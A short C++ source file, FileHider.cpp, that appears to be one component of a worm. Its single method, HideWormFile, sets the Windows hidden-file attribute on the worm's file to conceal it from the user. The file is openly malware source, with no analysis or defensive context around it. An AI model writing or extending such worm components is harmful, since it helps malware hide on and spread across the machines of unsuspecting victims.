// FileHider.cpp
#include "FileHider.h"
#include <Windows.h>

void FileHider::HideWormFile(const std::string& wormPath) {
    DWORD attributes = GetFileAttributes(wormPath.c_str());
    if (attributes != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributes(wormPath.c_str(), attributes | FILE_ATTRIBUTE_HIDDEN);
    }
}
